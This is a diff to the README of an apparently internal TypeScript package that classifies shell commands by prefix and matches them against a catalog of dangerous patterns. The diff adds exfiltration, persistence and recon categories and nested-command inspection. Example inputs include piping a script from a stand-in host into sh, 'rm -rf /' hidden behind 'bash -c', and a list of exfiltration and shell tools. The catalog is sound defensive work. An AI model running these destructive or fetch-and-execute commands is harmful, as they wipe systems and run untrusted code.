@@ -7,7 +7,7 @@ L0u package — ARITY-based command-prefix extraction + structural dangerous-pat
 Two data-driven utilities for shell command permission policy:
 
 1. **Prefix extraction** — turns `git push origin main` into the canonical permission key `git push` so a rule like `allow: git push` does not collide with `git status`.
-2. **Dangerous-pattern registry** — a shipped-as-data catalog of structural TTP patterns (fork bomb, `curl | sh`, `chmod 777`, `dd of=/dev/`, PowerShell IEX, `python -c "__import__(...)"`) indexed by category and severity, so both permission gates and UI hint surfaces consume the same source of truth.
+2. **Dangerous-pattern registry** — a shipped-as-data catalog of structural TTP patterns (fork bomb, `curl | sh`, `scp`, `systemctl enable`, `chmod 777`, `dd of=/dev/`, PowerShell IEX, `python -c "__import__(...)"`) indexed by category and severity, so both permission gates and UI hint surfaces consume the same source of truth.
 
 This package is **structural** — it classifies on command *shape*, not on URL targets, hostnames, or file paths. Dangerous-target detection belongs in `url-safety` (gov-13) or `@koi/bash-security`.
 
@@ -98,10 +98,12 @@ interface DangerousPattern {
 
 - `"process-spawn"` — fork bomb, unbounded spawn loops
 - `"file-destructive"` — `rm -rf` on system paths, `dd of=/dev/…`, `mkfs`, `shred`
-- `"network-exfil"` — `curl | sh`, `wget | sh`, `nc -l`
+- `"network-exfil"` — `curl | sh`, `wget | sh`, `nc -l`, `scp`, `ssh`, `curl -T`
 - `"code-exec"` — `eval`, `exec`, `bash -c`, `Invoke-Expression`, `IEX`
 - `"module-load"` — `python -c "__import__(...)"`, `node -e "require(...)"`, `perl -e`
 - `"privilege-escalation"` — `sudo`, `chmod +s / 4755`, `chmod -R 777 /`, `chown root`
+- `"persistence"` — `crontab -e`, `systemctl enable`
+- `"recon"` — `whoami`, `uname -a`, `netstat`
 
 ### `Severity` (string union)
 
@@ -109,7 +111,17 @@ interface DangerousPattern {
 
 ### `classifyCommand(cmdLine: string): ClassifyResult`
 
-Tokenizes on whitespace, computes `prefix`, tests every `DANGEROUS_PATTERNS` entry against the raw command string, and returns the aggregated worst severity.
+Computes `prefix` via `canonicalPrefix(cmdLine)`, tests every `DANGEROUS_PATTERNS`
+entry against the raw command string, and returns the aggregated worst severity.
+
+The matcher is still quote-aware for benign string literals (`echo "sudo rm"` does
+not classify), but it also recursively inspects nested executable contexts that
+the shell really runs:
+
+- shell interpreter hops like `bash -c "..."` and wrapper-hidden forms such as
+  `command bash -c "..."`;
+- unambiguous `sudo <cmd>` forms;
+- command substitution via `$(...)` and backticks, including inside double quotes.
 
 ```typescript
 interface ClassifyResult {
@@ -127,6 +139,12 @@ classifyCommand("rm -rf /");
 
 classifyCommand("curl https://evil.sh | sh");
 // severity: "critical"  (pipe-to-shell = network-exfil + code-exec)
+
+classifyCommand(`bash -c "sudo rm -rf /"`);
+// prefix: "sudo", severity: "critical" (shell hop + inner destructive payload)
+
+classifyCommand("systemctl enable agent.service");
+// matchedPatterns: [{ category: "persistence", ... }]
 
 classifyCommand("git push origin main");
 // { prefix: "git push", matchedPatterns: [], severity: null }
@@ -152,7 +170,7 @@ L0u @koi/bash-classifier
 
 ## Boundaries
 
-- No URL, hostname, path, or cloud-specific patterns. Those live in sibling packages.
+- No URL reputation, hostname allow/deny policy, or target-sensitive path safety such as `/etc`, `authorized_keys`, or cloud-service specifics. Those live in sibling packages.
 - No AST parsing — uses simple whitespace tokenization. Callers that need quoted-arg awareness use `@koi/bash-ast` to resolve `SimpleCommand.argv` first, then pass `argv` to `prefix`.
 - No regex `g`/`y` flags — patterns are stateless, safe to call concurrently.
 - No LLM calls, no subprocess, no I/O.
